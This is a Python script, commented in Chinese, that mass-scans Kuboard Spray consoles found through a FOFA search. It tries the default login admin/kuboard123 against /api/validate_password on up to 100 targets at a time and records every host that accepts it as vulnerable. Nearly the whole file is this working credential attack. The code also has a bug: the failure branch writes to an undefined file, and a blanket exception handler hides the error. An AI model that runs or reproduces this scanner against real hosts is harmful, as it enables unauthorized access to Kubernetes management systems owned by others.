#fofa:Kutitle="Kuboard Spray"
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
  _          _                         _ 
 | |        | |                       | |
 | | ___   _| |__   ___   __ _ _ __ __| |
 | |/ / | | | '_ \ / _ \ / _` | '__/ _` |
 |   <| |_| | |_) | (_) | (_| | | | (_| |
 |_|\_\\__,_|_.__/ \___/ \__,_|_|  \__,_|
                                         
                                         
                                                         
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="kuboard弱口令")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/api/validate_password'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept':'application/json,text/plain,*/*',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/json',
        'Authorization':'Bearerundefined',
        'Content-Length':'44',
        #'Origin':'http://1.12.245.254:8080',
        'Connection':'close',
        #'Referer':'http://1.12.245.254:8080/',
        'Cookie':'_ga_0D2X8HMY8R=GS1.1.1721357555.1.0.1721357555.0.0.0;_ga=GA1.1.837612410.1721357555',
        'Priority':'u=0',
       
            }
    data = {"username":"admin","password":"kuboard123"}
    try:
        res = requests.post(url=target + payload,verify=False,headers=headers,json=data)
        #print(res.status_code)
        if json.loads(res.text)['code'] ==200:
            with open('result2.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
        else:
            f.write(f'[-]{target}不存在漏洞 \n')
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
